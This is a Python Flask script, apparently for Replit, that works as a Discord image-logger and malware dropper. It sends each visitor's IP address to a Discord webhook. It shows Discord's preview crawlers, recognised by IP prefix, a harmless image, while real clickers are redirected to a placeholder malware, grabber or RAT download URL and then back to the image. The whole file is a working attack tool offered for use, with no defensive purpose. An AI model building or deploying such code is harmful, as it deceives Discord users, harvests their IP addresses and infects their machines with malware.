#Give credits
#you can only use this in replit
import requests, io
from flask import Flask, request, send_file
from discord_webhook import DiscordWebhook

app = Flask(
__name__,
  template_folder='templates',
  static_folder='static'
)
@app.route('/', methods=['GET'])
def main():
  Image = 'https://media.discordapp.net/attachments/968125334023196692/975668105281953832/Screenshot_2022-05-12-21-50-16.jpeg' #put your image
  
  Malicious = '' #put your malware/grabber/rat download url here
  
  
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    ip = request.environ['REMOTE_ADDR']
  else:
    ip = request.environ['HTTP_X_FORWARDED_FOR']
    webhook = DiscordWebhook(url='webhook url here',#put your webhook url
rate_limit_retry=True,
                         content=f'@everyone Someone clicked the image {ip}')
  response = webhook.execute()

  if ip.startswith('35.') or ip.startswith('34.'):
    # If discord is getting a link preview send a image
    return send_file(
    io.BytesIO(requests.get(Image).content),
    mimetype='image/jpeg',
    attachment_filename='s.png')
  else:
    # If a real person is clicking the link send a malicious file and redirect back to the image
    return f'''<meta http-equiv="refresh" content="0; url={Malicious}">
               '''+'''
          <script>setTimeout(function() {
            ''' + f'window.location = "{Image}"''''
          }, 8000)</script>''' # If the file doesn't download change the 500 to a higher number like 1000
if __name__ == '__main__':
  # Run the Flask app
  app.run(
  host='0.0.0.0',
  debug=True,
  port=8080 #you can change your port
  )